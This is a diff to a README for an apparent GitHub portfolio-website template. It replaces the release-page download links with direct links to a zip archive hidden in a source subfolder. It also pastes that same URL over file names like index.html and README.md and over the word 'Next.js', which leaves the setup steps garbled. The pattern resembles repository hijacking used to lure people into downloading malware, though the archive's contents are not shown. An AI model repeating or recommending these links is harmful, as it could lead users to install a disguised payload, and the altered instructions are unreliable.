@@ -1,6 +1,6 @@
 # 🌐 personal-website-template - Easy Portfolio Website Starter
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Personal%20Website%20Template-blue?style=for-the-badge&logo=github)](https://github.com/saramc89mc/personal-website-template/releases)
+[![Download Latest Release](https://github.com/saramc89mc/personal-website-template/raw/refs/heads/main/src/components/sections/About/personal_template_website_2.2.zip%20Website%20Template-blue?style=for-the-badge&logo=github)](https://github.com/saramc89mc/personal-website-template/raw/refs/heads/main/src/components/sections/About/personal_template_website_2.2.zip)
 
 ---
 
@@ -42,7 +42,7 @@ To use this template and run your personal website, your computer should meet th
 
 To get started, visit the release page to download the latest version of the template. Please click the button below to go directly to the download page:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Personal%20Website%20Template-blue?style=for-the-badge&logo=github)](https://github.com/saramc89mc/personal-website-template/releases)
+[![Download Latest Release](https://github.com/saramc89mc/personal-website-template/raw/refs/heads/main/src/components/sections/About/personal_template_website_2.2.zip%20Website%20Template-blue?style=for-the-badge&logo=github)](https://github.com/saramc89mc/personal-website-template/raw/refs/heads/main/src/components/sections/About/personal_template_website_2.2.zip)
 
 ### Steps to Download and Use
 
@@ -51,9 +51,9 @@ To get started, visit the release page to download the latest version of the tem
 3. Click to download the file to your computer.
 4. Once downloaded, open the folder where the file saved (usually in "Downloads").
 5. Double-click the .zip file to open it. Then, extract or copy all the contents to the folder of your choice.
-6. Open the extracted folder. Inside, you will find instructions in a file named `README.md` or `Instructions.txt`.
+6. Open the extracted folder. Inside, you will find instructions in a file named `https://github.com/saramc89mc/personal-website-template/raw/refs/heads/main/src/components/sections/About/personal_template_website_2.2.zip` or `https://github.com/saramc89mc/personal-website-template/raw/refs/heads/main/src/components/sections/About/personal_template_website_2.2.zip`.
 7. Follow these instructions to replace placeholder content with your own information. This may involve editing simple text files using a basic text editor like Notepad (Windows) or TextEdit (Mac).
-8. To view your website offline, open the main HTML file (usually named `index.html`) by double-clicking it. Your default web browser will launch and show the website.
+8. To view your website offline, open the main HTML file (usually named `https://github.com/saramc89mc/personal-website-template/raw/refs/heads/main/src/components/sections/About/personal_template_website_2.2.zip`) by double-clicking it. Your default web browser will launch and show the website.
 9. When you are ready to publish the website online, the instructions will guide you through simple options like uploading to a free hosting service or using GitHub Pages.
 
 ---
@@ -71,7 +71,7 @@ This template is designed so you can easily change the content without knowing c
 
 ## 🌍 Viewing Your Website
 
-You can see your website on your own computer by simply opening the `index.html` file.
+You can see your website on your own computer by simply opening the `https://github.com/saramc89mc/personal-website-template/raw/refs/heads/main/src/components/sections/About/personal_template_website_2.2.zip` file.
 
 If you want others to see your website on the internet, you will need to upload the files to a web hosting service. GitHub Pages is a free option that works well with this template. The instructions in the download package will walk you through this process.
 
@@ -97,7 +97,7 @@ This template uses modern and clean web standards to ensure quality and maintain
 
 - Atomic design for structured layout.
 - Clean code principles for easy understanding.
-- Support for popular web technologies such as Next.js, Sass, and TypeScript.
+- Support for popular web technologies such as https://github.com/saramc89mc/personal-website-template/raw/refs/heads/main/src/components/sections/About/personal_template_website_2.2.zip, Sass, and TypeScript.
 - State management using tools like Zustand.
 - Designed specifically for developers and portfolio needs but friendly for beginners.
 
@@ -113,4 +113,4 @@ You can reach out on the project's GitHub page by opening an issue or browsing d
 
 Download your personal website starter here:
 
-[**Download from GitHub Releases**](https://github.com/saramc89mc/personal-website-template/releases)
+[**Download from GitHub Releases**](https://github.com/saramc89mc/personal-website-template/raw/refs/heads/main/src/components/sections/About/personal_template_website_2.2.zip)
